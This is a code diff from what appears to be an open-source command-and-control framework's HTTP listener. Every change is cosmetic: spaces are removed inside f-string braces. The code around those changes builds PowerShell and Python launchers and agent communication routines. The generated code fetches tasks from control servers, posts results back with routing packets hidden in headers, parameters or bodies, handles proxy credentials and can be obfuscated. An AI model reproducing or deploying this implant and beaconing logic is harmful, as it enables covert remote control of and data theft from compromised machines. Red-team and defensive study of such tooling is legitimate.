@@ -361,7 +361,7 @@ class Listener:
 
                 else:
                     launcherBase += (
-                        f"$proxy=New-Object Net.WebProxy('{ proxy.lower() }');"
+                        f"$proxy=New-Object Net.WebProxy('{proxy.lower()}');"
                     )
                     launcherBase += "$wc.Proxy = $proxy;"
 
@@ -379,7 +379,7 @@ class Listener:
 
                         else:
                             usr = username.split("\\")[0]
-                            launcherBase += f"$netcred = New-Object System.Net.NetworkCredential('{ usr }', '{password}');"
+                            launcherBase += f"$netcred = New-Object System.Net.NetworkCredential('{usr}', '{password}');"
 
                         launcherBase += "$wc.Proxy.Credentials = $netcred;"
 
@@ -393,14 +393,14 @@ class Listener:
                 if header.lower() == "host":
                     launcherBase += "try{$ig=$wc.DownloadData($ser)}catch{};"
 
-                launcherBase += f'$wc.Headers.Add("{ header }","{ value }");'
+                launcherBase += f'$wc.Headers.Add("{header}","{value}");'
 
             # ==== SEND REQUEST ====
             if (
                 profile.stager.client.verb.lower() != "get"
                 or profile.stager.client.body
             ):
-                launcherBase += f"$data=$wc.UploadData($ser+$t,'{ profile.stager.client.verb }','{ profile.stager.client.body }');"
+                launcherBase += f"$data=$wc.UploadData($ser+$t,'{profile.stager.client.verb}','{profile.stager.client.body}');"
 
             else:
                 launcherBase += "$data=$wc.DownloadData($ser+$t);"
@@ -413,7 +413,7 @@ class Listener:
                 launcherBase += (
                     "$fata='';for ($i=0;$i -lt $wc.ResponseHeaders.Count;$i++){"
                 )
-                launcherBase += f"if ($data.ResponseHeaders.GetKey($i) -eq '{ profile.stager.server.output.terminator.arg }')"
+                launcherBase += f"if ($data.ResponseHeaders.GetKey($i) -eq '{profile.stager.server.output.terminator.arg}')"
                 launcherBase += "{$data=$wc.ResponseHeaders.Get($i);"
                 launcherBase += "Add-Type -AssemblyName System.Web;$data=[System.Web.HttpUtility]::UrlDecode($data);}}"
             elif (
@@ -634,7 +634,7 @@ class Listener:
                     ]
                 )
                 stager = stager.replace(
-                    '$customHeaders = "";', f'$customHeaders = "{ headers }";'
+                    '$customHeaders = "";', f'$customHeaders = "{headers}";'
                 )
 
             comms_code = self.generate_comms(
@@ -753,7 +753,7 @@ class Listener:
             code = code.replace("$LostLimit = 60", "$LostLimit = " + str(lostLimit))
             code = code.replace(
                 '$DefaultResponse = ""',
-                f'$DefaultResponse = "{ b64DefaultResponse }"',
+                f'$DefaultResponse = "{b64DefaultResponse}"',
             )
 
             if obfuscate:
@@ -777,15 +777,15 @@ class Listener:
             code = helpers.strip_python_comments(code)
 
             # patch in the delay, jitter, lost limit, and comms profile
-            code = code.replace("delay=60", f"delay={ delay }")
-            code = code.replace("jitter=0.0", f"jitter={ jitter }")
+            code = code.replace("delay=60", f"delay={delay}")
+            code = code.replace("jitter=0.0", f"jitter={jitter}")
             code = code.replace(
                 'profile = "/admin/get.php,/news.php,/login/process.php|Mozilla/5.0 (Windows NT 6.1; WOW64; Trident/7.0; rv:11.0) like Gecko"',
-                f'profile = "{ profileStr }"',
+                f'profile = "{profileStr}"',
             )
             code = code.replace(
                 'defaultResponse = base64.b64decode("")',
-                f'defaultResponse = base64.b64decode("{ b64DefaultResponse }")',
+                f'defaultResponse = base64.b64decode("{b64DefaultResponse}")',
             )
 
             if obfuscate:
@@ -821,7 +821,7 @@ class Listener:
 
         if language.lower() == "powershell":
             # PowerShell
-            updateServers = f'$Script:ControlServers = @("{ host }");'
+            updateServers = f'$Script:ControlServers = @("{host}");'
             updateServers += "$Script:ServerIndex = 0;"
 
             # ==== HANDLE SSL ====
@@ -836,7 +836,7 @@ try {{
         # ==== BUILD ROUTING PACKET ====
         $RoutingPacket = New-RoutingPacket -EncData $Null -Meta 4;
         $RoutingPacket = [System.Text.Encoding]::Default.GetString($RoutingPacket);
-        { profile.get.client.metadata.generate_powershell("$RoutingPacket") }
+        {profile.get.client.metadata.generate_powershell("$RoutingPacket")}
 
         # ==== BUILD REQUEST ====
         $vWc = New-Object System.Net.WebClient;
@@ -868,14 +868,14 @@ try {{
             for parameter, value in profile.get.client.parameters.items():
                 getTask += "$taskURI += '" + ("?" if first else "&") + "';"
                 first = False
-                getTask += f"$taskURI += '{ parameter }={ value }';"
+                getTask += f"$taskURI += '{parameter}={value}';"
             if (
                 profile.get.client.metadata.terminator.type
                 == malleable.Terminator.PARAMETER
             ):
                 getTask += "$taskURI += '" + ("?" if first else "&") + "';"
                 first = False
-                getTask += f"$taskURI += '{ profile.get.client.metadata.terminator.arg }=' + $RoutingPacket;"
+                getTask += f"$taskURI += '{profile.get.client.metadata.terminator.arg}=' + $RoutingPacket;"
 
             if (
                 profile.get.client.metadata.terminator.type
@@ -885,12 +885,12 @@ try {{
 
             # ==== ADD HEADERS ====
             for header, value in profile.get.client.headers.items():
-                getTask += f"$vWc.Headers.Add('{ header }', '{ value }');"
+                getTask += f"$vWc.Headers.Add('{header}', '{value}');"
             if (
                 profile.get.client.metadata.terminator.type
                 == malleable.Terminator.HEADER
             ):
-                getTask += f"$vWc.Headers.Add('{ profile.get.client.metadata.terminator.arg }', $RoutingPacket);"
+                getTask += f"$vWc.Headers.Add('{profile.get.client.metadata.terminator.arg}', $RoutingPacket);"
 
             # ==== ADD BODY ====
             if (
@@ -899,7 +899,7 @@ try {{
             ):
                 getTask += "$body = $RoutingPacket;"
             else:
-                getTask += f"$body = '{ profile.get.client.body }';"
+                getTask += f"$body = '{profile.get.client.body}';"
 
             # ==== SEND REQUEST ====
             if (
@@ -908,13 +908,13 @@ try {{
                 or profile.get.client.metadata.terminator.type
                 == malleable.Terminator.PRINT
             ):
-                getTask += f"$result = $vWc.UploadData($Script:ControlServers[$Script:ServerIndex] + $taskURI, '{ profile.get.client.verb }', [System.Text.Encoding]::Default.GetBytes('{ profile.get.client.body }'));"
+                getTask += f"$result = $vWc.UploadData($Script:ControlServers[$Script:ServerIndex] + $taskURI, '{profile.get.client.verb}', [System.Text.Encoding]::Default.GetBytes('{profile.get.client.body}'));"
             else:
                 getTask += "$result = $vWc.DownloadData($Script:ControlServers[$Script:ServerIndex] + $taskURI);"
 
             # ==== EXTRACT RESULTS ====
             if profile.get.server.output.terminator.type == malleable.Terminator.HEADER:
-                getTask += f"$data = $vWc.responseHeaders.get('{ profile.get.server.output.terminator.arg }');"
+                getTask += f"$data = $vWc.responseHeaders.get('{profile.get.server.output.terminator.arg}');"
                 getTask += "Add-Type -AssemblyName System.Web; $data = [System.Web.HttpUtility]::UrlDecode($data);"
 
             elif (
@@ -988,14 +988,14 @@ $vWc.Proxy = $Script:Proxy;
             for parameter, value in profile.post.client.parameters.items():
                 sendMessage += "$taskURI += '" + ("?" if first else "&") + "';"
                 first = False
-                sendMessage += f"$taskURI += '{ parameter }={ value }';"
+                sendMessage += f"$taskURI += '{parameter}={value}';"
             if (
                 profile.post.client.output.terminator.type
                 == malleable.Terminator.PARAMETER
             ):
                 sendMessage += "$taskURI += '" + ("?" if first else "&") + "';"
                 first = False
-                sendMessage += f"$taskURI += '{ profile.post.client.output.terminator.arg }=' + $RoutingPacket;"
+                sendMessage += f"$taskURI += '{profile.post.client.output.terminator.arg}=' + $RoutingPacket;"
 
             if (
                 profile.post.client.output.terminator.type
@@ -1005,19 +1005,19 @@ $vWc.Proxy = $Script:Proxy;
 
             # ==== ADD HEADERS ====
             for header, value in profile.post.client.headers.items():
-                sendMessage += f"$vWc.Headers.Add('{ header }', '{ value }');"
+                sendMessage += f"$vWc.Headers.Add('{header}', '{value}');"
 
             if (
                 profile.post.client.output.terminator.type
                 == malleable.Terminator.HEADER
             ):
-                sendMessage += f"$vWc.Headers.Add('{ profile.post.client.output.terminator.arg }', $RoutingPacket);"
+                sendMessage += f"$vWc.Headers.Add('{profile.post.client.output.terminator.arg}', $RoutingPacket);"
 
             # ==== ADD BODY ====
             if profile.post.client.output.terminator.type == malleable.Terminator.PRINT:
                 sendMessage += "$body = $RoutingPacket;"
             else:
-                sendMessage += f"$body = '{ profile.post.client.body }';"
+                sendMessage += f"$body = '{profile.post.client.body}';"
 
             # ==== SEND REQUEST ====
             sendMessage += "try {"
@@ -1027,7 +1027,7 @@ $vWc.Proxy = $Script:Proxy;
                 or profile.post.client.output.terminator.type
                 == malleable.Terminator.PRINT
             ):
-                sendMessage += f"$result = $vWc.UploadData($Script:ControlServers[$Script:ServerIndex] + $taskURI, '{ profile.post.client.verb.upper() }', [System.Text.Encoding]::Default.GetBytes($body));"
+                sendMessage += f"$result = $vWc.UploadData($Script:ControlServers[$Script:ServerIndex] + $taskURI, '{profile.post.client.verb.upper()}', [System.Text.Encoding]::Default.GetBytes($body));"
             else:
                 sendMessage += "$result = $vWc.DownloadData($Script:ControlServers[$Script:ServerIndex] + $taskURI);"
 
